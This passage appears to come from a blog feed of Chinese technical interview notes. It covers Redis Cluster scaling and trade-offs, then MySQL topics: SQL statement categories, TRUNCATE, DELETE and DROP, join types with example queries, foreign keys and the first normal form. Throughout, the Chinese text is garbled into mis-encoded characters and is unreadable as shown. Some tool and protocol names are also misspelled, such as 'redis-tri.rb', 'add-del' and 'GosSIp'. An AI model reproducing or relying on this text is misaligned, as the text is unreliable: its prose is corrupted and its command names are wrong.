<p>æ‰©å®¹æ—¶ï¼Œå…ˆä½¿ç”¨<code>redis-tri.rb add-node</code>å°†æ–°çš„æœºå™¨åŠ åˆ°é›†ç¾¤ä¸­ï¼Œè¿™æ˜¯æ–°æœºå™¨è™½ç„¶å·²ç»åœ¨é›†ç¾¤ä¸­äº†ï¼Œä½†æ˜¯æ²¡æœ‰åˆ†é… slotsï¼Œä¾ç„¶æ˜¯ä¸èµ·åšç”¨çš„ã€‚åœ¨ä½¿ç”¨ <code> redis-tri.rb reshard</code>è¿›è¡Œåˆ†ç‰‡é‡å“ˆå¸Œï¼ˆæ•°æ®è¿ç§»ï¼‰ï¼Œå°†æ—§èŠ‚ç‚¹ä¸Šçš„ slots åˆ†é…åˆ°æ–°èŠ‚ç‚¹ä¸Šåï¼Œæ–°èŠ‚ç‚¹æ‰èƒ½èµ·ä½œç”¨ã€‚</p>
<p>ç¼©å®¹æ—¶ï¼Œå…ˆè¦ä½¿ç”¨ <code> redis-tri.rb reshard</code>ç§»é™¤çš„æœºå™¨ä¸Šçš„ slotsï¼Œç„¶åä½¿ç”¨<code>redis-tri.rb add-del</code>ç§»é™¤æœºå™¨ã€‚</p>
<h4 id="é›†ç¾¤æ¨¡å¼çš„ä¼˜ç¼ºç‚¹"><a href="#é›†ç¾¤æ¨¡å¼çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="é›†ç¾¤æ¨¡å¼çš„ä¼˜ç¼ºç‚¹"></a>é›†ç¾¤æ¨¡å¼çš„ä¼˜ç¼ºç‚¹</h4><h5 id="ä¼˜ç‚¹-2"><a href="#ä¼˜ç‚¹-2" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h5><p>é‡‡ç”¨å»ä¸­å¿ƒåŒ–æ€æƒ³ï¼Œæ•°æ®æŒ‰ç…§ slot å­˜å‚¨åˆ†å¸ƒåœ¨å¤šä¸ªèŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹é—´æ•°æ®å…±äº«ï¼Œå¯åŠ¨æ€è°ƒæ•´æ•°æ®åˆ†å¸ƒ;</p>
<p>å¯æ‰©å±•æ€§ï¼šå¯çº¿æ€§æ‰©å±•åˆ° 1000 å¤šä¸ªèŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹å¯åŠ¨æ€æ·»åŠ æˆ–åˆ é™¤ã€‚</p>
<p>é«˜å¯ç”¨æ€§ï¼šéƒ¨åˆ†èŠ‚ç‚¹ä¸å¯ç”¨æ—¶ï¼Œé›†ç¾¤ä»å¯ç”¨ã€‚é€šè¿‡å¢åŠ  Slave åš standby æ•°æ®å‰¯æœ¬ï¼Œèƒ½å¤Ÿå®ç°æ•…éšœè‡ªåŠ¨ failoverï¼ŒèŠ‚ç‚¹ä¹‹é—´é€šè¿‡ gossip åè®®äº¤æ¢çŠ¶æ€ä¿¡æ¯ï¼Œç”¨æŠ•ç¥¨æœºåˆ¶å®Œæˆ Slave åˆ° Master çš„è§’è‰²æå‡ã€‚</p>
<p>é™ä½è¿ç»´æˆæœ¬ï¼Œæé«˜ç³»ç»Ÿçš„æ‰©å±•æ€§å’Œå¯ç”¨æ€§ã€‚</p>
<h5 id="ç¼ºç‚¹-2"><a href="#ç¼ºç‚¹-2" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h5><p>1.Redis Cluster æ˜¯æ— ä¸­å¿ƒèŠ‚ç‚¹çš„é›†ç¾¤æ¶æ„ï¼Œä¾é  Goss åè®®ï¼ˆè°£è¨€ä¼ æ’­ï¼‰ååŒè‡ªåŠ¨åŒ–ä¿®å¤é›†ç¾¤çš„çŠ¶æ€</p>
<p>ä½† GosSIp æœ‰æ¶ˆæ¯å»¶æ—¶å’Œæ¶ˆæ¯å†—ä½™çš„é—®é¢˜ï¼Œåœ¨é›†ç¾¤èŠ‚ç‚¹æ•°é‡è¿‡å¤šçš„æ—¶å€™ï¼ŒèŠ‚ç‚¹ä¹‹é—´éœ€è¦ä¸æ–­è¿›è¡Œ PING&#x2F;PANG é€šè®¯ï¼Œä¸å¿…é¡»è¦çš„æµé‡å ç”¨äº†å¤§é‡çš„ç½‘ç»œèµ„æºã€‚è™½ç„¶ Redis4.0 å¯¹æ­¤è¿›è¡Œäº†ä¼˜åŒ–ï¼Œä½†è¿™ä¸ªé—®é¢˜ä»ç„¶å­˜åœ¨ã€‚</p>
<p>2.æ•°æ®è¿ç§»é—®é¢˜</p>
<p>Redis Cluster å¯ä»¥è¿›è¡ŒèŠ‚ç‚¹çš„åŠ¨æ€æ‰©å®¹ç¼©å®¹ï¼Œè¿™ä¸€è¿‡ç¨‹ï¼Œåœ¨ç›®å‰å®ç°ä¸­ï¼Œè¿˜å¤„äºåŠè‡ªåŠ¨çŠ¶æ€ï¼Œéœ€è¦äººå·¥ä»‹å…¥ã€‚åœ¨æ‰©ç¼©å®¹çš„æ—¶å€™ï¼Œéœ€è¦è¿›è¡Œæ•°æ®è¿ç§»ã€‚</p>
<p>è€Œ Redis ä¸ºäº†ä¿è¯è¿ç§»çš„ä¸€è‡´æ€§ï¼Œè¿ç§»æ‰€æœ‰æ“ä½œéƒ½æ˜¯åŒæ­¥æ“ä½œï¼Œæ‰§è¡Œè¿ç§»æ—¶ï¼Œä¸¤ç«¯çš„ Redis å‡ä¼šè¿›å…¥æ—¶é•¿ä¸ç­‰çš„é˜»å¡çŠ¶æ€ï¼Œå¯¹äºå° Keyï¼Œè¯¥æ—¶é—´å¯ä»¥å¿½ç•¥ä¸è®¡ï¼Œä½†å¦‚æœä¸€æ—¦ Key çš„å†…å­˜ä½¿ç”¨è¿‡å¤§ï¼Œä¸¥é‡çš„æ—¶å€™ä¼šæ¥è§¦å‘é›†ç¾¤å†…çš„æ•…éšœè½¬ç§»ï¼Œé€ æˆä¸å¿…è¦çš„åˆ‡æ¢ã€‚</p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ä¸»ä»æ¨¡å¼ï¼šmaster èŠ‚ç‚¹æŒ‚æ‰åï¼Œéœ€è¦æ‰‹åŠ¨æŒ‡å®šæ–°çš„ masterï¼Œå¯ç”¨æ€§ä¸é«˜ï¼ŒåŸºæœ¬ä¸ç”¨ã€‚</p>
<p>å“¨å…µæ¨¡å¼ï¼šmaster èŠ‚ç‚¹æŒ‚æ‰åï¼Œå“¨å…µè¿›ç¨‹ä¼šä¸»åŠ¨é€‰ä¸¾æ–°çš„ masterï¼Œå¯ç”¨æ€§é«˜ï¼Œä½†æ˜¯æ¯ä¸ªèŠ‚ç‚¹å­˜å‚¨çš„æ•°æ®æ˜¯ä¸€æ ·çš„ï¼Œæµªè´¹å†…å­˜ç©ºé—´ã€‚æ•°æ®é‡ä¸æ˜¯å¾ˆå¤šï¼Œé›†ç¾¤è§„æ¨¡ä¸æ˜¯å¾ˆå¤§ï¼Œéœ€è¦è‡ªåŠ¨å®¹é”™å®¹ç¾çš„æ—¶å€™ä½¿ç”¨ã€‚</p>
<p>é›†ç¾¤æ¨¡å¼ï¼šæ•°æ®é‡æ¯”è¾ƒå¤§ï¼ŒQPS è¦æ±‚è¾ƒé«˜çš„æ—¶å€™ä½¿ç”¨ã€‚ <strong>Redis Cluster æ˜¯ Redis 3.0 ä»¥åæ‰æ­£å¼æ¨å‡ºï¼Œæ—¶é—´è¾ƒæ™šï¼Œç›®å‰èƒ½è¯æ˜åœ¨å¤§è§„æ¨¡ç”Ÿäº§ç¯å¢ƒä¸‹æˆåŠŸçš„æ¡ˆä¾‹è¿˜ä¸æ˜¯å¾ˆå¤šï¼Œéœ€è¦æ—¶é—´æ£€éªŒã€‚</strong></p>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL</title>
    <url>/2022/02/15/%E9%9D%A2%E8%AF%95/MySQL/</url>
    <content><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151504917.png" alt="image-20210423222127334"></p>
<h2 id="DMLã€DDLã€DCLåŒºåˆ«ä»¥åŠå®šä¹‰"><a href="#DMLã€DDLã€DCLåŒºåˆ«ä»¥åŠå®šä¹‰" class="headerlink" title="DMLã€DDLã€DCLåŒºåˆ«ä»¥åŠå®šä¹‰"></a>DMLã€DDLã€DCLåŒºåˆ«ä»¥åŠå®šä¹‰</h2><p>ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼ˆStructured Query Languageï¼ŒSQLï¼‰æ˜¯ç”¨äºç®¡ç†å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRDBMSï¼‰ã€‚ SQL çš„èŒƒå›´åŒ…æ‹¬æ•°æ®æ’å…¥ã€æŸ¥è¯¢ã€æ›´æ–°å’Œåˆ é™¤ï¼Œæ•°æ®åº“æ¨¡å¼åˆ›å»ºå’Œä¿®æ”¹ï¼Œä»¥åŠæ•°æ®è®¿é—®æ§åˆ¶ã€‚</p>
<p>æ•°æ®æ“ä½œè¯­è¨€ï¼ˆData Manipulation Languageï¼ŒDMLï¼‰ç”¨äºæ£€ç´¢æˆ–è€…ä¿®æ”¹æ•°æ®ã€‚DMLåŒ…æ‹¬ï¼šSELECTã€DELETEã€ UPDATEå’ŒINSERTã€‚</p>
<p>æ•°æ®å®šä¹‰è¯­è¨€ï¼ˆData Definition Languageï¼ŒDDLï¼‰ç”¨äºå®šä¹‰æ•°æ®çš„ç»“æ„ï¼Œæ¯”å¦‚åˆ›å»ºã€ä¿®æ”¹æˆ–è€…åˆ é™¤æ•°æ®åº“å¯¹è±¡DDLåŒ…æ‹¬ï¼šCREATE TABLEã€ALTER TABLEã€DROP TABLEã€CREATE INDEXã€DROP INDEXå’ŒTRUNCATE TABLEã€‚</p>
<p>æ•°æ®æ§åˆ¶è¯­è¨€ï¼ˆData Control Languageï¼ŒDCLï¼‰ç”¨äºå®šäºæ•°æ®åº“ç”¨æˆ·çš„æƒé™ã€‚DCLåŒ…æ‹¬ï¼šALTER PASSWORDã€GRANTã€REVOKE å’ŒCREATE SYNONYMã€‚</p>
<h2 id="TRUNCATEã€DELETEå’ŒDROPçš„åŒºåˆ«"><a href="#TRUNCATEã€DELETEå’ŒDROPçš„åŒºåˆ«" class="headerlink" title="TRUNCATEã€DELETEå’ŒDROPçš„åŒºåˆ«"></a>TRUNCATEã€DELETEå’ŒDROPçš„åŒºåˆ«</h2><ul>
<li>truncate tableç±»ä¼¼äºdeleteåˆ é™¤æ‰€æœ‰è¡Œçš„è¯­å¥æˆ–drop tableç„¶åå†create tableè¯­å¥çš„ç»„åˆã€‚</li>
<li>truncateä¸ºäº†å®ç°é«˜æ€§èƒ½ï¼Œå®ƒç»•è¿‡äº†åˆ é™¤æ•°æ®çš„DMLæ–¹æ³•ï¼Œå› æ­¤ï¼Œå®ƒä¸èƒ½å›æ»šã€‚</li>
<li>truncateä¼šæ¸…ç©ºæ‰€æœ‰æ•°æ®ä¸”æ‰§è¡Œé€Ÿåº¦å¾ˆå¿«ã€‚</li>
<li>truncateä¸èƒ½å¯¹æœ‰å¤–é”®çº¦æŸå¼•ç”¨çš„è¡¨ä½¿ç”¨ã€‚</li>
<li>æ‰§è¡Œtruncateéœ€è¦dropæƒé™ï¼Œä¸å»ºè®®ç»™è´¦å·dropæƒé™ã€‚</li>
<li>æ‰§è¡Œtruncateå‰ä¸€å®šè¦å†ä¸‰æ£€æŸ¥ç¡®è®¤ï¼Œæœ€å¥½æå‰å¤‡ä»½ä¸‹è¡¨æ•°æ®ã€‚</li>
<li>truncateä¸dropæ˜¯DDLè¯­å¥ï¼Œæ‰§è¡Œåæ— æ³•é€šè¿‡binlogå›æ»šï¼›deleteæ˜¯DMLè¯­å¥ï¼Œå¯å›æ»šã€‚</li>
<li>truncateåªèƒ½ä½œç”¨äºè¡¨ï¼›deleteï¼Œdropå¯ä½œç”¨äºè¡¨ã€è§†å›¾ç­‰ã€‚</li>
<li>truncateåˆ é™¤æ²¡æœ‰è¿”å›å€¼ï¼›deleteåˆ é™¤æœ‰è¿”å›å€¼ã€‚</li>
<li>truncateåˆ é™¤åæ’å…¥ä»0å¼€å§‹ï¼›deleteä»åˆ é™¤æ—¶çš„ä¸‹ä¸€ä¸ªä½ç½®å¼€å§‹ï¼›</li>
<li>truncateä¼šæ¸…ç©ºè¡¨ä¸­çš„æ‰€æœ‰è¡Œï¼Œä½†è¡¨ç»“æ„åŠå…¶çº¦æŸã€ç´¢å¼•ç­‰ä¿æŒä¸å˜ï¼›dropä¼šåˆ é™¤è¡¨çš„ç»“æ„åŠå…¶æ‰€ä¾èµ–çš„çº¦æŸã€ç´¢å¼•ç­‰ã€‚</li>
<li>truncateä¸ä¼šæ¿€æ´»ä¸è¡¨æœ‰å…³çš„åˆ é™¤è§¦å‘å™¨ï¼›deleteå¯ä»¥ã€‚</li>
<li>truncateåä¼šä½¿è¡¨å’Œç´¢å¼•æ‰€å ç”¨çš„ç©ºé—´ä¼šæ¢å¤åˆ°åˆå§‹å¤§å°ï¼›deleteæ“ä½œä¸ä¼šå‡å°‘è¡¨æˆ–ç´¢å¼•æ‰€å ç”¨çš„ç©ºé—´ï¼›dropè¯­å¥å°†è¡¨æ‰€å ç”¨çš„ç©ºé—´å…¨é‡Šæ”¾æ‰ã€‚</li>
<li>åœ¨InnoDBä¸­ï¼Œdeleteæ“ä½œå¹¶ä¸ä¼šçœŸçš„åˆ é™¤æ•°æ®ï¼Œmysqlå®é™…ä¸Šåªæ˜¯ç»™è¦åˆ é™¤çš„æ•°æ®æ‰“äº†æ ‡è®°ï¼Œæ ‡è®°ä¸ºåˆ é™¤ã€‚ç£ç›˜æ‰€å ç©ºé—´ä¸ä¼šå˜å°ï¼Œå³è¡¨ç©ºé—´å¹¶æ²¡æœ‰çœŸæ­£è¢«é‡Šæ”¾ã€‚</li>
</ul>
<h2 id="äº¤å‰è¿æ¥ã€å†…è¿æ¥ã€å¤–è¿æ¥ã€è”åˆè¿æ¥å’Œè‡ªç„¶è¿æ¥"><a href="#äº¤å‰è¿æ¥ã€å†…è¿æ¥ã€å¤–è¿æ¥ã€è”åˆè¿æ¥å’Œè‡ªç„¶è¿æ¥" class="headerlink" title="äº¤å‰è¿æ¥ã€å†…è¿æ¥ã€å¤–è¿æ¥ã€è”åˆè¿æ¥å’Œè‡ªç„¶è¿æ¥"></a>äº¤å‰è¿æ¥ã€å†…è¿æ¥ã€å¤–è¿æ¥ã€è”åˆè¿æ¥å’Œè‡ªç„¶è¿æ¥</h2><h3 id="äº¤å‰è¿æ¥ï¼ˆCROSS-JOINï¼‰"><a href="#äº¤å‰è¿æ¥ï¼ˆCROSS-JOINï¼‰" class="headerlink" title="äº¤å‰è¿æ¥ï¼ˆCROSS JOINï¼‰"></a>äº¤å‰è¿æ¥ï¼ˆCROSS JOINï¼‰</h3><p> äº¤å‰è¿æ¥ï¼ˆCROSS JOINï¼‰ï¼šæœ‰ä¸¤ç§ï¼Œæ˜¾å¼çš„å’Œéšå¼çš„ï¼Œä¸å¸¦ONå­å¥ï¼ˆåœ¨MySQLæ”¯æŒONï¼Œå’ŒINNER JOINç­‰ä»·ï¼‰ï¼Œè¿”å›çš„æ˜¯ä¸¤è¡¨çš„ä¹˜ç§¯ï¼Œä¹Ÿå«ç¬›å¡å°”ç§¯ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># éšå¼çš„äº¤å‰è¿æ¥</span><br><span class="line"><span class="keyword">select</span> a.qq, b.name <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a, `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">where</span> a.id <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"># æ˜¾å¼çš„äº¤å‰è¿æ¥</span><br><span class="line"><span class="keyword">select</span> a.qq, b.name <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">cross</span> <span class="keyword">join</span> `<span class="keyword">user</span>` b <span class="keyword">where</span> a.id <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="å†…è¿æ¥ï¼ˆINNER-JOINï¼‰"><a href="#å†…è¿æ¥ï¼ˆINNER-JOINï¼‰" class="headerlink" title="å†…è¿æ¥ï¼ˆINNER JOINï¼‰"></a>å†…è¿æ¥ï¼ˆINNER JOINï¼‰</h3><p>å†…è¿æ¥ï¼ˆINNER JOINï¼‰ï¼šæœ‰ä¸¤ç§ï¼Œæ˜¾å¼çš„å’Œéšå¼çš„ï¼Œè¿”å›è¿æ¥è¡¨ä¸­ç¬¦åˆè¿æ¥æ¡ä»¶å’ŒæŸ¥è¯¢æ¡ä»¶çš„æ•°æ®è¡Œã€‚ï¼ˆæ‰€è°“çš„é“¾æ¥è¡¨å°±æ˜¯æ•°æ®åº“åœ¨åšæŸ¥è¯¢å½¢æˆçš„ä¸­é—´è¡¨ï¼‰ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># éšå¼çš„å†…è¿æ¥ï¼Œæ²¡æœ‰<span class="keyword">INNER</span> <span class="keyword">JOIN</span>ï¼Œå½¢æˆçš„ä¸­é—´è¡¨ä¸ºä¸¤ä¸ªè¡¨çš„ç¬›å¡å°”ç§¯ã€‚</span><br><span class="line"><span class="keyword">select</span> a.qq, b.name <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a, `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">where</span> a.id <span class="operator">=</span> b.id</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºçš„å†…è¿æ¥ï¼Œä¸€èˆ¬ç§°ä¸ºå†…è¿æ¥ï¼Œæœ‰<span class="keyword">INNER</span> <span class="keyword">JOIN</span>ï¼Œå½¢æˆçš„ä¸­é—´è¡¨ä¸ºä¸¤ä¸ªè¡¨ç»è¿‡<span class="keyword">ON</span>æ¡ä»¶è¿‡æ»¤åçš„ç¬›å¡å°”ç§¯ã€‚</span><br><span class="line"><span class="keyword">select</span> a.qq, b.name <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">inner</span> <span class="keyword">join</span> `<span class="keyword">user</span>` b <span class="keyword">on</span> a.id <span class="operator">=</span> b.id</span><br></pre></td></tr></table></figure>

<h3 id="å¤–è¿æ¥ï¼ˆOUTER-JOINï¼‰"><a href="#å¤–è¿æ¥ï¼ˆOUTER-JOINï¼‰" class="headerlink" title="å¤–è¿æ¥ï¼ˆOUTER JOINï¼‰"></a>å¤–è¿æ¥ï¼ˆOUTER JOINï¼‰</h3><p>å¤–è¿æ¥ï¼ˆOUTER JOINï¼‰ä¸ä½†è¿”å›ç¬¦åˆè¿æ¥å’ŒæŸ¥è¯¢æ¡ä»¶çš„æ•°æ®è¡Œï¼Œè¿˜è¿”å›ä¸ç¬¦åˆæ¡ä»¶çš„ä¸€äº›è¡Œã€‚å¤–è¿æ¥åˆ†ä¸‰ç±»ï¼šå·¦å¤–è¿æ¥ï¼ˆLEFT OUTER JOINï¼‰ã€å³å¤–è¿æ¥ï¼ˆRIGHT OUTER JOINï¼‰å’Œå…¨å¤–è¿æ¥ï¼ˆFULL OUTER JOINï¼‰ã€‚åœ¨ä¸‰ç§ç±»å‹çš„å¤–è¿æ¥ä¸­ï¼ŒOUTER å…³é”®å­—æ˜¯å¯çœç•¥çš„ã€‚ </p>
<p>ä¸‰è€…çš„å…±åŒç‚¹æ˜¯éƒ½è¿”å›ç¬¦åˆè¿æ¥æ¡ä»¶å’ŒæŸ¥è¯¢æ¡ä»¶ï¼ˆå³ï¼šå†…è¿æ¥ï¼‰çš„æ•°æ®è¡Œã€‚</p>
<p>ä¸åŒç‚¹å¦‚ä¸‹ï¼š </p>
<ul>
<li>å·¦å¤–è¿æ¥è¿˜è¿”å›å·¦è¡¨ä¸­ä¸ç¬¦åˆè¿æ¥æ¡ä»¶å•ç¬¦åˆæŸ¥è¯¢æ¡ä»¶çš„æ•°æ®è¡Œã€‚</li>
<li>å³å¤–è¿æ¥è¿˜è¿”å›å³è¡¨ä¸­ä¸ç¬¦åˆè¿æ¥æ¡ä»¶å•ç¬¦åˆæŸ¥è¯¢æ¡ä»¶çš„æ•°æ®è¡Œã€‚</li>
<li>å…¨å¤–è¿æ¥è¿˜è¿”å›å·¦è¡¨ä¸­ä¸ç¬¦åˆè¿æ¥æ¡ä»¶å•ç¬¦åˆæŸ¥è¯¢æ¡ä»¶çš„æ•°æ®è¡Œï¼Œå¹¶ä¸”è¿˜è¿”å›å³è¡¨ä¸­ä¸ç¬¦åˆè¿æ¥æ¡ä»¶å•ç¬¦åˆæŸ¥è¯¢æ¡ä»¶çš„æ•°æ®è¡Œã€‚å…¨å¤–è¿æ¥å®é™…æ˜¯ä¸Šå·¦å¤–è¿æ¥å’Œå³å¤–è¿æ¥çš„æ•°å­¦åˆé›†ï¼ˆå»æ‰é‡å¤ï¼‰ï¼Œå³â€œå…¨å¤–&#x3D;å·¦å¤– UNION å³å¤–â€ã€‚åœ¨MySQLä¸­ä¸æ”¯æŒå…¨å¤–è¿æ¥ï¼Œå¯ä»¥ç”¨â€œå·¦å¤– UNION å³å¤–â€å®ç°å…¨å¤–è¿æ¥ã€‚</li>
</ul>
<h3 id="è”åˆè¿æ¥ï¼ˆUNION-JOINï¼‰"><a href="#è”åˆè¿æ¥ï¼ˆUNION-JOINï¼‰" class="headerlink" title="è”åˆè¿æ¥ï¼ˆUNION JOINï¼‰"></a>è”åˆè¿æ¥ï¼ˆUNION JOINï¼‰</h3><p>è¿™æ˜¯ä¸€ç§å¾ˆå°‘è§çš„è¿æ¥æ–¹å¼ã€‚Oracleã€MySQLå‡ä¸æ”¯æŒï¼Œå…¶ä½œç”¨æ˜¯ï¼šæ‰¾å‡ºå…¨å¤–è¿æ¥å’Œå†…è¿æ¥ä¹‹é—´å·®å¼‚çš„æ‰€æœ‰è¡Œã€‚è¿™åœ¨æ•°æ®åˆ†æä¸­æ’é”™ä¸­æ¯”è¾ƒå¸¸ç”¨ã€‚ä¹Ÿå¯ä»¥åˆ©ç”¨æ•°æ®åº“çš„é›†åˆæ“ä½œæ¥å®ç°æ­¤åŠŸèƒ½ã€‚</p>
<h3 id="è‡ªç„¶è¿æ¥ï¼ˆNATURAL-INNER-JOINï¼‰"><a href="#è‡ªç„¶è¿æ¥ï¼ˆNATURAL-INNER-JOINï¼‰" class="headerlink" title="è‡ªç„¶è¿æ¥ï¼ˆNATURAL INNER JOINï¼‰"></a>è‡ªç„¶è¿æ¥ï¼ˆNATURAL INNER JOINï¼‰</h3><p>è‡ªç„¶è¿æ¥æ— éœ€æŒ‡å®šè¿æ¥åˆ—ï¼ŒSQLä¼šæ£€æŸ¥ä¸¤ä¸ªè¡¨ä¸­æ˜¯å¦ç›¸åŒåç§°çš„åˆ—ï¼Œä¸”å‡è®¾ä»–ä»¬åœ¨è¿æ¥æ¡ä»¶ä¸­ä½¿ç”¨ï¼Œå¹¶ä¸”åœ¨è¿æ¥æ¡ä»¶ä¸­ä»…åŒ…å«ä¸€ä¸ªè¿æ¥åˆ—ã€‚</p>
<p>MySQLç¯å¢ƒä¸‹ï¼šä¸å…è®¸ä½¿ç”¨ONè¯­å¥ï¼Œå…è®¸æŒ‡å®šæ˜¾å¼åˆ—ã€‚è‡ªç„¶è¿æ¥åˆ†ä¸ºå†…å¤–ä¹‹åˆ†ã€‚å†…ï¼šNATURAL JOINï¼ˆä¸èƒ½åŠ INNERï¼‰ã€‚å¤–ï¼šNATURAL LEFT JOINå’ŒNATURAL RIGHT JOINã€‚</p>
<p>ORACLEç¯å¢ƒä¸‹ï¼šä¸å…è®¸ä½¿ç”¨ONè¯­å¥ï¼Œä¸å…è®¸æŒ‡å®šæ˜¾å¼åˆ—ï¼Œæ˜¾å¼åˆ—åªèƒ½ç”¨*è¡¨ç¤ºã€‚å¯¹äºæ¯ç§è¿æ¥ç±»å‹ï¼ˆé™¤äº†äº¤å‰è¿æ¥å¤–ï¼‰ï¼Œå‡å¯æŒ‡å®šNATURALã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name,age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">natural</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b</span><br><span class="line"># å¦‚æœä¸¤å¼ è¡¨éƒ½æœ‰nameï¼Œageå­—æ®µï¼Œç›¸å½“äºå¦‚ä¸‹è¯­å¥ï¼Œä½†æ˜¯å¿…é¡»å†™a.name,a.age</span><br><span class="line"><span class="keyword">select</span> a.name,a.age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">on</span> a.name <span class="operator">=</span> b.name <span class="keyword">and</span> a.age <span class="operator">=</span> b.age</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> name,age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">natural</span> <span class="keyword">left</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b</span><br><span class="line"># å¦‚æœä¸¤å¼ è¡¨éƒ½æœ‰nameï¼Œageå­—æ®µï¼Œç›¸å½“äºå¦‚ä¸‹è¯­å¥ï¼Œä½†æ˜¯å¿…é¡»å†™a.name,a.age</span><br><span class="line"><span class="keyword">select</span> a.name,a.age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">left</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">on</span> a.name <span class="operator">=</span> b.name <span class="keyword">and</span> a.age <span class="operator">=</span> b.age</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> name,age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">natural</span> <span class="keyword">right</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b</span><br><span class="line"># å¦‚æœä¸¤å¼ è¡¨éƒ½æœ‰nameï¼Œageå­—æ®µï¼Œç›¸å½“äºå¦‚ä¸‹è¯­å¥ï¼Œä½†æ˜¯å¿…é¡»å†™b.name,b.age</span><br><span class="line"><span class="keyword">select</span> b.name,b.age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a  <span class="keyword">right</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">on</span> a.name <span class="operator">=</span> b.name <span class="keyword">and</span> a.age <span class="operator">=</span> b.age</span><br></pre></td></tr></table></figure>

<h2 id="å¤–é”®çº¦æŸ"><a href="#å¤–é”®çº¦æŸ" class="headerlink" title="å¤–é”®çº¦æŸ"></a>å¤–é”®çº¦æŸ</h2><p>ä¸»è¡¨ä¸­æ²¡æœ‰çš„æ•°æ®å€¼ï¼Œåœ¨å‰¯è¡¨ä¸­æ˜¯ä¸å¯ä»¥ä½¿ç”¨çš„ã€‚ä¸»è¡¨ä¸­çš„è®°å½•è¢«å‰¯è¡¨å¼•ç”¨ï¼Œæ˜¯ä¸å¯ä»¥è¢«åˆ é™¤çš„</p>
<h2 id="ä¸‰å¤§èŒƒå¼"><a href="#ä¸‰å¤§èŒƒå¼" class="headerlink" title="ä¸‰å¤§èŒƒå¼"></a>ä¸‰å¤§èŒƒå¼</h2><p><a href="https://zhuanlan.zhihu.com/p/20028672">https://zhuanlan.zhihu.com/p/20028672</a> </p>
<h3 id="ç¬¬ä¸€èŒƒå¼ï¼ˆåˆ—ä¸å¯åˆ†ï¼‰"><a href="#ç¬¬ä¸€èŒƒå¼ï¼ˆåˆ—ä¸å¯åˆ†ï¼‰" class="headerlink" title="ç¬¬ä¸€èŒƒå¼ï¼ˆåˆ—ä¸å¯åˆ†ï¼‰"></a>ç¬¬ä¸€èŒƒå¼ï¼ˆåˆ—ä¸å¯åˆ†ï¼‰</h3><p>å®šä¹‰ï¼šæ•°æ®åº“è¡¨çš„æ¯ä¸€åˆ—éƒ½æ˜¯ä¸å¯åˆ†å‰²çš„åŸå­æ•°æ®é¡¹ï¼Œè€Œä¸èƒ½æ˜¯é›†åˆï¼Œæ•°ç»„ï¼Œè®°å½•ç­‰éåŸå­æ•°æ®é¡¹ã€‚å¦‚æœå®ä½“ä¸­çš„æŸä¸ªå±æ€§æœ‰å¤šä¸ªå€¼æ—¶ï¼Œå¿…é¡»æ‹†åˆ†ä¸ºä¸åŒçš„å±æ€§ã€‚</p>
<p><strong>1NFæ˜¯æ‰€æœ‰å…³ç³»å‹æ•°æ®åº“çš„æœ€åŸºæœ¬è¦æ±‚</strong>ï¼Œä½ åœ¨å…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRDBMSï¼‰ï¼Œä¾‹å¦‚SQL Serverï¼ŒOracleï¼ŒMySQLä¸­åˆ›å»ºæ•°æ®è¡¨çš„æ—¶å€™ï¼Œå¦‚æœæ•°æ®è¡¨çš„è®¾è®¡ä¸ç¬¦åˆè¿™ä¸ªæœ€åŸºæœ¬çš„è¦æ±‚ï¼Œé‚£ä¹ˆæ“ä½œä¸€å®šæ˜¯ä¸èƒ½æˆåŠŸçš„ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<p>ä¸æ»¡è¶³ç¬¬ä¸€èŒƒå¼</p>
<table>
<thead>
<tr>
<th>å­¦å·</th>
<th>å§“å</th>
<th>ç­çº§</th>
</tr>
</thead>
<tbody><tr>
<td>0001</td>
<td>å°çº¢</td>
<td>é«˜ä¸‰1ç­</td>
</tr>
</tbody></table>
